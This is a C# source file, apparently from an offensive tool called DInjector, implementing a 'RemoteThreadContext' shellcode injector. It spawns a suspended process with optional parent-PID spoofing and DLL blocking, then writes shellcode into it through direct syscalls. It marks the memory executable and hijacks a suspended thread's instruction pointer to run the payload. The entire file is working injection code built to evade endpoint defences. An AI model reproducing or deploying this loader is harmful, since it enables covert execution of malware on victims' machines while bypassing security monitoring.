﻿using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadContext
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtWriteVirtualMemory");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtWriteVirtualMemory: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (LoadLibraryA, CREATE_SUSPENDED)

            IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr loadLibraryAddr = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                loadLibraryAddr,
                IntPtr.Zero,
                true, // CREATE_SUSPENDED
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtCreateThreadEx, LoadLibraryA, CREATE_SUSPENDED: {ntstatus}");

            #endregion

            #region GetThreadContext

            Registers.CONTEXT64 ctx = new Registers.CONTEXT64();
            ctx.ContextFlags = Registers.CONTEXT_FLAGS.CONTEXT_CONTROL;

            ntstatus = Syscalls.NtGetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtGetContextThread");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtGetContextThread: {ntstatus}");

            #endregion

            #region SetThreadContext

            ctx.Rip = (UInt64)baseAddress;

            ntstatus = Syscalls.NtSetContextThread(
                hThread,
                ref ctx);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtSetContextThread");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtSetContextThread: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadContext) [+] NtResumeThread");
            else
                Console.WriteLine($"(RemoteThreadContext) [-] NtResumeThread: {ntstatus}");

            #endregion

            Win32.CloseHandle(hThread);
            Win32.CloseHandle(hProcess);
        }
    }
}
